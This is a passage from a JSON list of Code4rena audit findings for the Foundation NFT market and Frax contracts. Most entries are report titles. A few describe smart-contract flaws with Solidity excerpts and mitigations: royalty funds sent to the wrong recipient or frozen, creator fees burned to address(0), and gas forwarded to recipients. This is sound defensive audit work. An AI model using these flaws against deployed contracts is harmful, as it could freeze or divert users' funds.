after a sale.   */ function _distributeFunds(   address nftContract,   uint256 tokenId,   address payable seller,   uint256 price,   address payable buyReferrer )   internal   returns (     uint256 totalFees,     uint256 creatorRev,     uint256 sellerRev   ) {   address payable[] memory creatorRecipients;   uint256[] memory creatorShares;    uint256 buyReferrerFee;   (totalFees, creatorRecipients, creatorShares, sellerRev, buyReferrerFee) = _getFees(     nftContract,     tokenId,     seller,     price,     buyReferrer   );    // Pay the creator(s)   unchecked {     for (uint256 i = 0; i < creatorRecipients.length; ++i) {       _sendValueWithFallbackWithdraw(         creatorRecipients[i],         creatorShares[i],         SEND_VALUE_GAS_LIMIT_MULTIPLE_RECIPIENTS // @audit-info A higher amount of gas is forwarded to creator recipients       );       // Sum the total creator rev from shares       // creatorShares is in ETH so creatorRev will not overflow here.       creatorRev += creatorShares[i];     }   }    // Pay the seller   _sendValueWithFallbackWithdraw(seller, sellerRev, SEND_VALUE_GAS_LIMIT_SINGLE_RECIPIENT);    // Pay the protocol fee   _sendValueWithFallbackWithdraw(getFoundationTreasury(), totalFees, SEND_VALUE_GAS_LIMIT_SINGLE_RECIPIENT);    // Pay the buy referrer fee   if (buyReferrerFee != 0) {     _sendValueWithFallbackWithdraw(buyReferrer, buyReferrerFee, SEND_VALUE_GAS_LIMIT_SINGLE_RECIPIENT);     emit BuyReferralPaid(nftContract, tokenId, buyReferrer, buyReferrerFee, 0);     unchecked {       // Add the referrer fee back into the total fees so that all 3 return fields sum to the total price for events       totalFees += buyReferrerFee;     }   } } ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Consider only providing a higher amount of gas (`SEND_VALUE_GAS_LIMIT_MULTIPLE_RECIPIENTS`) for the first creator recipient. For all following creator recipients, only forward the reduced amount of gas `SEND_VALUE_GAS_LIMIT_SINGLE_RECIPIENT`. "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/161", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/156", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/155", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "User-controlled external calls.", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/153", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged", "old-submission-method"], "target": "2022-08-foundation-findings", "body": "User-controlled external calls."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/151", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/150", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/149", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/148", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Forget to check \"Some manifolds contracts of ERC-2981 return (address(this), 0) when royalties are not defined\" in 3rd priority - MarketFees.sol", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/147", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "old-submission-method"], "target": "2022-08-foundation-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/shared/MarketFees.sol#L299-L301   # Vulnerability details  ## Impact Wrong return of `cretorShares` and `creatorRecipients` can make real royalties party can't gain the revenue of sale.    ## Proof of concept  Function `getFees()` firstly [call](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/shared/MarketFees.sol#L422-L430) to function `internalGetImmutableRoyalties` to get the list of `creatorRecipients` and `creatorShares` if the `nftContract` define ERC2981 royalties.  ```solidity= try implementationAddress.internalGetImmutableRoyalties(nftContract, tokenId) returns (   address payable[] memory _recipients,   uint256[] memory _splitPerRecipientInBasisPoints ) {   (creatorRecipients, creatorShares) = (_recipients, _splitPerRecipientInBasisPoints); } catch // solhint-disable-next-line no-empty-blocks {   // Fall through } ``` ----- In the [1st priority](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/shared/MarketFees.sol#L236-L255) it check the `nftContract` define the function `royaltyInfo` or not. If yes, it get the return value `receiver` and `royaltyAmount`. In some manifold contracts of erc2981, it `return (address(this), 0)` when royalties are not defined. So we ignore it when the `royaltyAmount = 0`  ```solidity=   try IRoyaltyInfo(nftContract).royaltyInfo{ gas: READ_ONLY_GAS_LIMIT }(tokenId, BASIS_POINTS) returns (     address receiver,     uint256 royaltyAmount   ) {     // Manifold contracts return (address(this), 0) when royalties are not defined     // - so ignore results when the amount is 0     if (royaltyAmount > 0) {       recipients = new address payable[](1);       recipients[0] = payable(receiver);       splitPerRecipientInBasisPoints = new uint256[](1);       // The split amount is assumed to be 100% when only 1 recipient is returned       return (recipients, splitPerRecipientInBasisPoints);     } ``` ---- In the same sense, the [3rd priority](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/shared/MarketFees.sol#L297-L312) (it can reach to 3rd priority when function `internalGetImmutableRoyalies` fail to return some royalties) should check same as the 1st priority with the `royaltyRegistry.getRoyaltyLookupAddress`. But the 3rd priority forget to check the case when `royaltyAmount == 0`.  ```solidity=   try IRoyaltyInfo(nftContract).royaltyInfo{ gas: READ_ONLY_GAS_LIMIT }(tokenId, BASIS_POINTS) returns (     address receiver,     uint256 /* royaltyAmount */   ) {     recipients = new address payable[](1);     recipients[0] = payable(receiver);     splitPerRecipientInBasisPoints = new uint256[](1);     // The split amount is assumed to be 100% when only 1 recipient is returned     return (recipients, splitPerRecipientInBasisPoints);   }  ``` It will make [function](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/shared/MarketFees.sol#L98) `_distributeFunds()` transfer to wrong `creatorRecipients` (for example erc2981 return `(address(this), 0)`, market will transfer creator revenue to `address(this)` - market contract, and make the fund freeze in contract forever).  This case just happen when * `nftContract` doesn't have any support for royalties info  * `overrideContract` which was fetched from`royaltyRegistry.getRoyaltyLookupAddress(nftContract)` implements both function `getRoyalties` and `royaltyInfo` but doesn't support `royaltyInfo` by returning `(address(this), 0)`.   ## Tools Used Manual review     ## Recommended Mitigation Steps Add check if `royaltyAmount > 0` or not in 3rd priority  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/145", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/144", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/140", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/139", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/130", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/128", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/127", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/123", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/122", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/120", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/117", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/115", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/112", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/109", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/107", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/106", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/105", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/104", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/102", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/101", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/100", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/98", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/97", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Mints can be botted for hyped projects - bot protection is missing currently", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/93", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "Mints can be botted for hyped projects - bot protection is missing currently"}, {"title": "Because of ```unchecked```, the creator could bring back burned nft.", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/86", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "Because of ```unchecked```, the creator could bring back burned nft."}, {"title": "MarketFees.sol is not fully EIP-2981 compliant marketplace", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/85", "labels": ["bug", "duplicate", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "MarketFees.sol is not fully EIP-2981 compliant marketplace"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/83", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/82", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/80", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/77", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/76", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/75", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/74", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/73", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/72", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/71", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/70", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/69", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/67", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/66", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/65", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "referral system in NFTDropMarketFixedPriceSale allows buyer to purchase everything with a discount", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/62", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "referral system in NFTDropMarketFixedPriceSale allows buyer to purchase everything with a discount"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/61", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/60", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Possible to bypass saleConfig.limitPerAccount", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/59", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-08-foundation-findings", "body": "Possible to bypass saleConfig.limitPerAccount"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/57", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/56", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/55", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/53", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/52", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/51", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/49", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/48", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/47", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/45", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/44", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/43", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/42", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/41", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/38", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/37", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/35", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "User may get all of the creator fees by specifying high number for himself", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/34", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2022-08-foundation-findings", "body": "User may get all of the creator fees by specifying high number for himself"}, {"title": "Creator fees may be burned", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/31", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-08-foundation-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-foundation/blob/7d6392498e8f3b8cdc22beb582188ffb3ed25790/contracts/mixins/shared/MarketFees.sol#L128   # Vulnerability details  ## Impact `royaltyInfo`, `getRoyalties`, or `getFeeRecipients` may return `address(0)` as the recipient address. While the value 0 is correctly handled for the royalties itself, it is not for the address. In such a case, the ETH amount will be sent to `address(0)`, i.e. it is burned and lost.  ## Recommended Mitigation Steps In your logic for determining the recipients, treat `address(0)` as if no recipient was returned such that the other priorities / methods take over."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/25", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "postRevealBaseURIHash is redundant", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/21", "labels": ["bug", "duplicate", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "postRevealBaseURIHash is redundant"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/19", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/18", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/14", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/13", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/11", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/6", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/5", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/4", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Agreements & Disclosures", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/1", "labels": [], "target": "2022-08-foundation-findings", "body": "Agreements & Disclosures"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/364", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/363", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/362", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/360", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/359", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/358", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/357", "labels": ["bug", "low quality report", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/356", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/355", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/352", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/351", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/350", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/348", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/347", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/346", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/345", "labels": ["bug", "high quality report", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/344", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/343", "labels": ["bug", "low quality report", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/342", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/341", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/338", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/337", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/336", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/335", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/332", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/329", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/328", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/326", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/324", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/323", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/321", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/320", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/319", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/316", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/315", "labels": ["bug", "QA (Quality Assurance)"], "target": 